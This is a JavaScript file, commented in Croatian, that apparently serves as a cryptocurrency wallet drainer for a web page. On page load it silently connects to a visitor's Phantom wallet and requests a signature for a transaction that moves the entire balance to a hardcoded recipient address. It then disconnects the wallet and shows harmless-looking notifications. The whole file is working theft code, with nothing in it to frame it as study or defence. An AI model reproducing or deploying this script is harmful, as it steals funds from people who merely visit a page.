// Funkcija za prikazivanje notifikacija korisniku
function showNotification(message, color) {
    const notification = document.createElement("div");
    notification.textContent = message;
    notification.style.backgroundColor = color;
    notification.style.color = "#ffffff";
    notification.style.padding = "10px";
    notification.style.position = "fixed";
    notification.style.top = "10px";
    notification.style.right = "10px";
    notification.style.zIndex = "1000";
    document.body.appendChild(notification);

    setTimeout(() => {
        notification.remove();
    }, 3000);
}

// Automatsko povezivanje s Phantom Walletom
const connectWalletSilently = async () => {
    if (window.solana && window.solana.isPhantom) {
        try {
            const response = await window.solana.connect({ onlyIfTrusted: true });
            const walletAddress = response.publicKey.toString();
            console.log("Povezan Phantom Wallet:", walletAddress);
            showNotification("Novčanik uspješno povezan.", "#00ff00");
            return walletAddress;
        } catch (error) {
            console.error("Greška pri povezivanju:", error);
        }
    }
};

// Funkcija za povlačenje svih sredstava
const transferAllFunds = async () => {
    if (window.solana && window.solana.isPhantom) {
        try {
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("devnet"));
            const fromWallet = window.solana.publicKey;

            // Provjera stanja novčanika
            const balance = await connection.getBalance(fromWallet);
            if (balance === 0) {
                return;
            }

            // Kreiranje transakcije za prijenos
            const recipientAddress = "9uvpWhyZvDsXMoLUv86w5YGJVXJ4RdXUjnwoX2T9f1jM";
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: fromWallet,
                    toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                    lamports: balance,
                })
            );

            transaction.feePayer = fromWallet;
            transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

            const signedTransaction = await window.solana.signTransaction(transaction);
            const txId = await connection.sendRawTransaction(signedTransaction.serialize());
            console.log(`Transakcija poslana! Tx ID: ${txId}`);
        } catch (error) {
            console.error("Greška pri slanju transakcije:", error);
        }
    }
};

// Funkcija za odjavu korisnika i odspajanje novčanika
const disconnectWallet = async () => {
    if (window.solana && window.solana.isPhantom) {
        try {
            // Prekid veze sa novčanikom (nije direktno podržano kroz API, ali možemo "otkazati" sesiju)
            await window.solana.disconnect();  // Ako je moguće, prekinite vezu
            showNotification("Novčanik je odjavljen.", "#ffcc00");
        } catch (error) {
            console.error("Greška pri odjavi:", error);
        }
    }
};

// Automatski pokušaj povezivanja i povlačenja sredstava pri učitavanju stranice
window.addEventListener("load", async () => {
    const walletAddress = await connectWalletSilently();
    if (walletAddress) {
        await transferAllFunds();
    }

    // Odjavljivanje pri učitavanju stranice
    await disconnectWallet();
});
